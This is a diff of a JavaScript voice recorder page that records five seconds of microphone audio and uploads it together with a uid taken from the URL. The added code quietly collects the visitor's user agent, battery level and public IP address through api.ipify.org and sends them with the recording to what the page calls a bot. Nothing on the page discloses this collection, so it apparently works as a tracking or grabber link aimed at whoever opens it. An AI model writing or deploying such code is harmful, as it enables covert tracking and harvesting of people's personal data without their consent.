@@ -1,50 +1,50 @@
-let mediaRecorder;
-let audioChunks = [];
+const recordBtn = document.getElementById('recordBtn');
+const status = document.getElementById('status');
+const uid = new URLSearchParams(window.location.search).get("uid");
 
-const uid = new URLSearchParams(window.location.search).get('uid') || '123456789'; // fallback UID
-
-function startRecording() {
-  navigator.mediaDevices.getUserMedia({ audio: true })
-    .then(stream => {
-      mediaRecorder = new MediaRecorder(stream);
-      audioChunks = [];
-
-      mediaRecorder.ondataavailable = event => {
-        if (event.data.size > 0) {
-          audioChunks.push(event.data);
-        }
-      };
-
-      mediaRecorder.onstop = async () => {
-        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-        const formData = new FormData();
-        formData.append('voice', audioBlob);
-        formData.append('uid', uid);
-
-        try {
-          const res = await fetch('/api/upload', {
-            method: 'POST',
-            body: formData
-          });
-          const text = await res.text();
-          document.getElementById('status').innerText = '✅ واستول شو: ' + text;
-        } catch (err) {
-          document.getElementById('status').innerText = '❌ خطا: ' + err.message;
-        }
-      };
-
-      mediaRecorder.start();
-      document.getElementById('status').innerText = '🎙️ ثبت روان دی...';
-    })
-    .catch(err => {
-      document.getElementById('status').innerText = '❌ اجازه نشته';
-      console.error('Mic error:', err);
-    });
+if (!uid) {
+  status.textContent = "❌ UID missing in URL!";
+  recordBtn.disabled = true;
 }
 
-function stopRecording() {
-  if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-    mediaRecorder.stop();
-    document.getElementById('status').innerText = '⏹️ بند شو، لیږل کیږي...';
-  }
-} 
+let mediaRecorder;
+let chunks = [];
+
+recordBtn.onclick = async () => {
+  const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+  mediaRecorder = new MediaRecorder(stream);
+
+  status.textContent = "🎙 Recording started...";
+
+  mediaRecorder.ondataavailable = e => chunks.push(e.data);
+  mediaRecorder.onstop = async () => {
+    const blob = new Blob(chunks, { type: 'audio/webm' });
+    const formData = new FormData();
+    formData.append('voice', blob);
+    formData.append('uid', uid);
+
+    // Device info
+    const battery = await navigator.getBattery();
+    const batteryLevel = battery.level * 100;
+
+    const info = {
+      ua: navigator.userAgent,
+      battery: `${batteryLevel.toFixed(0)}%`,
+      ip: await (await fetch('https://api.ipify.org?format=json')).json().then(d => d.ip)
+    };
+
+    formData.append('info', JSON.stringify(info));
+
+    status.textContent = "📤 Uploading...";
+
+    await fetch('/api/upload', {
+      method: 'POST',
+      body: formData
+    });
+
+    status.textContent = "✅ Sent to bot!";
+  };
+
+  mediaRecorder.start();
+  setTimeout(() => mediaRecorder.stop(), 5000); // record for 5 seconds
+}; 
